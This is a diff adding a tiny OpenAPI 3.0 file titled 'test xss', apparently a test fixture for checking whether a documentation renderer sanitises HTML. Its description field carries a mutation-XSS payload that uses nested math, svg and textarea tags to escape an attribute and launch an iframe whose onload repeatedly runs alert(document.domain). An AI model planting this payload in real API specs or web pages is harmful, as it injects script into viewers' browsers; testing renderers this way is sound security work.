@@ -1,0 +1,7 @@
+openapi: "3.0.0"
+
+info:
+  title: test xss
+  description:
+    <h4>xss</h4>
+    xss<math><mi><table><mglyph><svg><mtext><textarea><a title="</textarea><iframe onload='setInterval(function () {alert(document.domain);}, 1000);'>"></a></textarea></mtext></svg></mglyph></table></mi></math>
